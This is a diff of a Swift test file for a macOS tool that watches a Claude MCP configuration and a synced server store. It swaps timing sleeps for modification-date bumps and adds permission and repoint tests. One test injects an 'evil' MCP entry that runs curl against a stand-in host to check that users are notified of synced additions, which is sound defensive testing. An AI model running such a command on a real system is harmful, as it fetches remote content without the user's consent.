@@ -1,22 +1,27 @@
 import XCTest
 import ConnectorControlCore
+import ConnectorControlTestSupport
 @testable import ConnectorControlState
 
 /// windows/tests/ConnectorControl.Core.Tests/State/AppStateWatcherTests.cs
-/// against the real DispatchSource watchers. The 300 ms sleeps keep the
-/// external write's mtime distinct from the file the harness just wrote.
+/// against the real DispatchSource watchers. `touchWatchedFiles()`/
+/// `TempDir.bumpModificationDate` keep an external write's mtime distinct
+/// from the file the harness (or a prior write in the same test) just wrote,
+/// deterministically — no sleep needed to let real time do that.
 @MainActor
 final class AppStateWatcherTests: XCTestCase {
     private let wait: TimeInterval = 8
+    /// A window to prove an event does NOT arrive (an echo stays quiet, a
+    /// watcher stays silent) — unlike `wait`, timing out here is the pass case,
+    /// so it cannot be replaced by `pumpUntil` waiting on a condition.
     private let settle: TimeInterval = 1.5
     private let fixture = ["aws-mcp", "scoutbook", "service-now"]
 
     func testClaudeConfigWatcherRegeneratesAnExternalEdit() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
         try h.writeClaudeServers([("scoutbook", try XCTUnwrap(state.store.mcps["scoutbook"]).config)])
+        try h.touchWatchedFiles()
         XCTAssertTrue(h.ui.pumpUntil({ h.notifier.sent.count == 1 }, timeout: wait))
         XCTAssertEqual(h.notifier.sent[0].body, AppState.claudeConfigRegeneratedBody)
         XCTAssertEqual(try h.claudeServers().keys.sorted(), fixture)
@@ -29,8 +34,8 @@ final class AppStateWatcherTests: XCTestCase {
         defer { h.dispose() }
         h.settings.notifyExternalChanges = false
         let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
         try h.writeClaudeServers([("scoutbook", try XCTUnwrap(state.store.mcps["scoutbook"]).config)])
+        try h.touchWatchedFiles()
         XCTAssertTrue(h.ui.pumpUntil({ (try? h.claudeServers().keys.sorted()) == self.fixture }, timeout: wait))
         _ = h.ui.pumpUntil({ false }, timeout: settle)   // give the regenerating write's own echo a chance to fire too
         XCTAssertTrue(h.notifier.sent.isEmpty)
@@ -42,10 +47,10 @@ final class AppStateWatcherTests: XCTestCase {
         h.claude.isRunning = true
         h.claude.launchDate = h.now.addingTimeInterval(-3600)
         let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
         var synced = try h.storeOnDisk()
         synced.mcps["scoutbook"]?.enabled = false
         try MasterStoreIO.save(synced, to: h.masterStoreURL)   // another machine's list arrives via sync
+        try h.touchWatchedFiles()
         XCTAssertTrue(h.ui.pumpUntil({ h.notifier.sent.count == 1 }, timeout: wait))
         XCTAssertEqual(h.notifier.sent[0], FakeNotifier.Sent(
             title: Notifications.title,
@@ -64,10 +69,10 @@ final class AppStateWatcherTests: XCTestCase {
         defer { h.dispose() }
         h.claude.isRunning = false
         let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
         var synced = try h.storeOnDisk()
         synced.mcps["evil"] = MCPEntry(config: .object(["command": .string("curl"), "args": .array([.string("https://x.example/run")])]))
         try MasterStoreIO.save(synced, to: h.masterStoreURL)   // another machine's list arrives via sync
+        try h.touchWatchedFiles()
         XCTAssertTrue(h.ui.pumpUntil({ h.notifier.sent.count == 1 }, timeout: wait))
         XCTAssertEqual(h.notifier.sent[0], FakeNotifier.Sent(
             title: Notifications.title,
@@ -77,23 +82,21 @@ final class AppStateWatcherTests: XCTestCase {
         XCTAssertFalse(state.needsClaudeRestart)
     }
 
-    func testStoreWatcherIgnoresOurOwnWriteEcho() {
-        let h = AppStateHarness()
+    func testStoreWatcherIgnoresOurOwnWriteEcho() throws {
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
         state.setEnabled("aws-mcp", false)
+        try h.touchWatchedFiles()
         _ = h.ui.pumpUntil({ false }, timeout: settle)
         XCTAssertTrue(h.notifier.sent.isEmpty)
         XCTAssertEqual(state.store.mcps["aws-mcp"]?.enabled, false)
     }
 
     func testStoreWatcherIgnoresAnUndecodablePartialWrite() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
         try Data("{\"version\": 2, \"acti".utf8).write(to: h.masterStoreURL)   // a sync tool mid-write
+        try h.touchWatchedFiles()
         _ = h.ui.pumpUntil({ false }, timeout: settle)
         XCTAssertEqual(state.sortedNames, fixture)
         XCTAssertEqual(try String(contentsOf: h.masterStoreURL, encoding: .utf8), "{\"version\": 2, \"acti")   // not moved aside: no reload happened
@@ -101,11 +104,9 @@ final class AppStateWatcherTests: XCTestCase {
     }
 
     func testDeletedStoreFileIsRePersistedFromMemory() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
-        try FileManager.default.removeItem(at: h.masterStoreURL)
+        try FileManager.default.removeItem(at: h.masterStoreURL)   // deletion is always distinct from any prior mtime: no separator needed
         XCTAssertTrue(h.ui.pumpUntil({ FileManager.default.fileExists(atPath: h.masterStoreURL.path) }, timeout: wait))
         XCTAssertEqual(try h.storeOnDisk(), state.store)
         XCTAssertTrue(h.notifier.sent.isEmpty)
@@ -113,16 +114,20 @@ final class AppStateWatcherTests: XCTestCase {
 
     /// The C# version repoints the Claude config into a directory that does not
     /// exist yet; the Mac has no such repoint, so the missing directory is the
-    /// Claude folder itself at launch (spec §6.3: both watchers live after every reload).
+    /// Claude folder itself at launch. Both watchers should be live after every reload.
     func testReloadArmsOnlyTheWatcherThatCouldNotArmYet() throws {
-        let h = AppStateHarness(seedClaudeConfig: false, createClaudeDirectory: false)
+        let (h, state) = AppStateHarness.started(seedClaudeConfig: false, createClaudeDirectory: false)
         defer { h.dispose() }
-        let state = h.create()
         // No Claude folder and no store written (an empty reconcile saves nothing): neither watcher could arm.
         XCTAssertFalse(state.watchersArmed)
         XCTAssertNil(state.upsert(name: "only", entry: MCPEntry(config: AppStateHarness.remote("https://only.example/mcp")), renamedFrom: nil))
         state.applyInteractively()   // creates the Claude folder and the file
         XCTAssertTrue(FileManager.default.fileExists(atPath: h.claudeConfigURL.path))
+        XCTAssertEqual(try XCTUnwrap(FileManager.default
+            .attributesOfItem(atPath: h.claudeConfigURL.path)[.posixPermissions] as? Int), 0o600, "the seeded file")
+        XCTAssertEqual(try XCTUnwrap(FileManager.default
+            .attributesOfItem(atPath: h.claudeConfigURL.deletingLastPathComponent().path)[.posixPermissions] as? Int),
+            0o700, "the created folder")
         XCTAssertFalse(state.watchersArmed, "an apply is not a reload: nothing re-arms yet")
         state.reload()
         XCTAssertTrue(state.watchersArmed, "the re-arm at the end of reload caught up")
@@ -134,16 +139,28 @@ final class AppStateWatcherTests: XCTestCase {
         XCTAssertEqual(state.watcherIdentities.claude, armed.claude, "an armed watcher is not replaced by reload")
         XCTAssertEqual(state.watcherIdentities.store, armed.store, "an armed watcher is not replaced by reload")
 
-        Thread.sleep(forTimeInterval: 0.3)
         try h.writeClaudeServers([("only", AppStateHarness.remote("https://moved.example/mcp"))])
+        try h.touchWatchedFiles()
         XCTAssertTrue(h.ui.pumpUntil({ h.notifier.sent.count == 1 }, timeout: wait))   // the location really is watched
         XCTAssertEqual(h.notifier.sent[0].body, AppState.claudeConfigRegeneratedBody)
     }
 
-    func testRepointStoreSeedsAnEmptyLocationAndReArmsTheWatcher() throws {
-        let h = AppStateHarness()
+    /// The store watcher's own directory disappearing (not just its file) is
+    /// self-healing: the deletion's own reload re-persists the store from
+    /// memory, recreating the directory the next reArm needs.
+    func testDeletingTheStoreDirectoryReArmsOnTheNextReload() throws {
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
+        XCTAssertTrue(state.watchersArmed)
+        try FileManager.default.removeItem(at: h.storeDir)
+        _ = h.ui.pumpUntil({ false }, timeout: settle)   // let the deletion's own detection run
+        state.reload()
+        XCTAssertTrue(state.watchersArmed)
+    }
+
+    func testRepointStoreSeedsAnEmptyLocationAndReArmsTheWatcher() throws {
+        let (h, state) = AppStateHarness.started()
+        defer { h.dispose() }
         let synced = h.dir.file("synced")
         state.repointStore(to: synced)
         XCTAssertEqual(h.settings.masterStoreDir, synced.path)
@@ -153,17 +170,17 @@ final class AppStateWatcherTests: XCTestCase {
         XCTAssertTrue(FileManager.default.fileExists(atPath: h.masterStoreURL.path))   // the previous file is never deleted
         XCTAssertTrue(h.notifier.sent.isEmpty)
 
-        Thread.sleep(forTimeInterval: 0.3)
         var edited = state.store
         edited.mcps["aws-mcp"]?.enabled = false
-        try MasterStoreIO.save(edited, to: synced.appendingPathComponent("mcps.json"))
+        let syncedStoreURL = synced.appendingPathComponent("mcps.json")
+        try MasterStoreIO.save(edited, to: syncedStoreURL)
+        try TempDir.bumpModificationDate(of: syncedStoreURL)   // the store now watches `synced`, not h.masterStoreURL
         XCTAssertTrue(h.ui.pumpUntil({ state.store.mcps["aws-mcp"]?.enabled == false }, timeout: wait))   // the new location is watched
     }
 
     func testRepointStoreAdoptsAnExistingStoreQuietly() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
         let synced = h.dir.file("synced")
         try FileManager.default.createDirectory(at: synced, withIntermediateDirectories: true)
         var theirs = state.store
@@ -178,10 +195,31 @@ final class AppStateWatcherTests: XCTestCase {
         XCTAssertTrue(h.notifier.sent.isEmpty)   // quiet adoption: the user is watching
     }
 
-    func testRepointStoreBackToTheDefault() {
-        let h = AppStateHarness()
+    /// The new location exists but cannot be written into (its directory is
+    /// write-blocked): the seed write throws, so the repoint must not adopt a
+    /// service pointed at a store that was never actually seeded.
+    func testARepointWhoseSeedCannotBeWrittenKeepsTheOldStore() throws {
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
+        let target = h.dir.file("blocked")
+        try FileManager.default.createDirectory(at: target, withIntermediateDirectories: true)
+        let block = try WriteBlock(target.appendingPathComponent("mcps.json"))
+        defer { block.dispose() }
+        XCTAssertTrue(block.isEffective)
+        let previousStoreDir = state.service.paths.storeDirURL
+        let beforeClaudeConfig = try Data(contentsOf: h.claudeConfigURL)
+
+        state.repointStore(to: target)
+
+        XCTAssertEqual(state.service.paths.storeDirURL, previousStoreDir)
+        XCTAssertNotNil(state.lastError)
+        XCTAssertEqual(try Data(contentsOf: h.claudeConfigURL), beforeClaudeConfig)
+        XCTAssertNil(h.settings.masterStoreDir, "restored to its previous value")
+    }
+
+    func testRepointStoreBackToTheDefault() {
+        let (h, state) = AppStateHarness.started()
+        defer { h.dispose() }
         state.repointStore(to: h.dir.file("synced"))
         state.repointStore(to: nil)
         XCTAssertNil(h.settings.masterStoreDir)
@@ -190,9 +228,8 @@ final class AppStateWatcherTests: XCTestCase {
     }
 
     func testRefreshServiceSettingsAppliesTheKeepCountWithoutReloading() {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
         h.settings.backupKeepCount = 7
         state.refreshServiceSettings()
         XCTAssertEqual(state.service.backups.keepCount, 7)
@@ -201,9 +238,8 @@ final class AppStateWatcherTests: XCTestCase {
     }
 
     func testRestoreClaudeConfigIsQuietAndSyncsTheBaseline() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
         state.setEnabled("aws-mcp", false)
         h.notifier.clearSent()
         h.now = h.now.addingTimeInterval(300)
@@ -219,24 +255,23 @@ final class AppStateWatcherTests: XCTestCase {
     }
 
     func testRestoreFailurePropagatesWithoutTouchingTheFile() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
         let bad = h.dir.file("bad.json")
         try Data("{not json".utf8).write(to: bad)
         let before = try Data(contentsOf: h.claudeConfigURL)
         XCTAssertThrowsError(try state.restoreClaudeConfig(from: bad)) { error in
-            XCTAssertEqual(error as? ClaudeConfigError, .malformed("backup bad.json is not a valid config file"))
+            XCTAssertEqual(error as? ClaudeConfigError, .malformed(
+                "backup bad.json is not a valid config file "
+                + "(The data couldn’t be read because it isn’t in the correct format.)"))
         }
         XCTAssertEqual(try Data(contentsOf: h.claudeConfigURL), before)
     }
 
     func testDisposeStopsTheWatchers() throws {
-        let h = AppStateHarness()
+        let (h, state) = AppStateHarness.started()
         defer { h.dispose() }
-        let state = h.create()
-        Thread.sleep(forTimeInterval: 0.3)
-        state.dispose()
+        state.dispose()   // stops the watchers before any external write: timing cannot matter here
         try h.writeClaudeServers([("scoutbook", try XCTUnwrap(state.store.mcps["scoutbook"]).config)])
         XCTAssertFalse(h.ui.pumpUntil({ !h.notifier.sent.isEmpty }, timeout: settle))
         XCTAssertEqual(try h.claudeServers().keys.sorted(), ["scoutbook"])   // nobody regenerated it
